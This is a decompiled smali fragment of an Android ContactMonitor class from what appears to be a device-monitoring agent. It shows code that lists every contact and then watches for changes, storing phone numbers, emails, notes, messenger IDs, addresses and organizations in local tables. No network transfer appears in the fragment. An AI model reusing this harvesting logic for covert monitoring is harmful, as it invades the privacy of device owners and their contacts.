    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/16 v1, 0x64

    .line 119
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/ContactMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 131
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v1

    .line 133
    const-class v2, Lcom/hp/vd/data/ContactPhoneData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 138
    const-class v2, Lcom/hp/vd/data/ContactEmailData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 144
    const-class v2, Lcom/hp/vd/data/ContactNoteData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 149
    const-class v2, Lcom/hp/vd/data/ContactInstantMessengerData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 154
    const-class v2, Lcom/hp/vd/data/ContactAddressData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 159
    const-class v2, Lcom/hp/vd/data/ContactOrganizationData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 181
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    .line 166
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    const-string v1, "ContactMonitor"

    const-string v2, "install(): exception caught during creating-second level tables"

    .line 168
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 479
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 9

    .line 405
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v8

    .line 411
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "ContactMonitor"

    const-string v1, "This module is currently DEactivated."

    .line 412
    invoke-interface {v8, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 417
    :cond_0
    new-instance v0, Lcom/hp/vd/module/monitor/contact/ContactObserver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v0

    move-object v2, p0

    move-object v6, v8

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/contact/ContactObserver;-><init>(Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    .line 424
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "gather_contacts_on_start"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 426
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    .line 428
    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    .line 429
    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 431
    :cond_1
    new-instance v0, Lcom/hp/vd/module/monitor/contact/ContactLister;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contactDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    move-object v1, v0

    move-object v2, p0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/contact/ContactLister;-><init>(Lcom/hp/vd/module/monitor/ContactMonitor;Landroid/content/ContentResolver;Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/contact/ContactObserver;Lcom/hp/vd/agent/log/IWriter;)V

    .line 433
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Contact-Initial-Lister-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    .line 434
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 442
    :cond_2
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentUri:Landroid/net/Uri;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 448
    iput-boolean v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->monitoringStatus:Z

    return v3
.end method

.method public stop()Z
    .locals 4

    .line 456
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 458
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    const/4 v2, 0x1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    if-eqz v1, :cond_0

    .line 459
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->observer:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    invoke-virtual {v1, v3}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    const-string v1, "ContactMonitor"

    const-string v3, "Contact content observer was unregistered."

    .line 460
    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 467
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 468
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->initialContactListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_1
    const/4 v0, 0x0

    .line 471
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->monitoringStatus:Z

    return v2
.end method

.method public uninstall()Z
    .locals 5

    .line 485
    invoke-super {p0}, Lcom/hp/vd/module/ModuleAbstract;->uninstall()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    .line 490
    :cond_0
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 491
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactPhoneData;

    const/4 v3, 0x1

    .line 490
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I

    .line 496
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 497
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactEmailData;

    .line 496
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I

    .line 502
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 503
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactNoteData;

    .line 502
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I

    .line 508
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 509
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactInstantMessengerData;

    .line 508
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I

    .line 514
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 515
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactAddressData;

    .line 514
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I

    .line 520
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    .line 521
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    const-class v2, Lcom/hp/vd/data/ContactOrganizationData;

    .line 520
    invoke-static {v0, v2, v3}, Lcom/j256/ormlite/table/TableUtils;->dropTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;Z)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception v0

    .line 527
    iget-object v2, p0, Lcom/hp/vd/module/monitor/ContactMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "ContactMonitor"

    const-string v4, "uninstall()"

    invoke-interface {v2, v3, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 6

    .line 192
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "ContactMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 195
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 211
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez p1, :cond_2

    if-eqz v0, :cond_1

    const-string p1, "ContactMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 227
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_1
    return v2

    :cond_2
    const-string v1, "max_contact_internal_id"

    .line 237
    invoke-virtual {p1, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "gather_contacts_on_start"

    .line 238
    invoke-virtual {p1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 244
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "system"

    .line 246
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ContactMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 244
    invoke-virtual {v3, v4, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 249
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    if-eqz v1, :cond_3

    const-string v3, "contact_max_contact_internal_id"

    .line 252
    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_3

    const-string v3, "ContactMonitor"

    .line 255
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "update(): from the previous module: contact_ATTRIBUTE_MAX_CONTACT_INTERNAL_ID: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_3
    if-eqz p1, :cond_4

    const-string v1, "contact_gather_contacts_on_start"

    .line 260
    invoke-interface {v2, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_4

    const-string v1, "ContactMonitor"

    .line 263
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): from the previous module: contact_ATTRIBUTE_GATHER_CONTACTS_ON_START: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 267
    :cond_4
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    if-eqz v0, :cond_5

    const-string p1, "ContactMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 215
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_5
    return v2
.end method
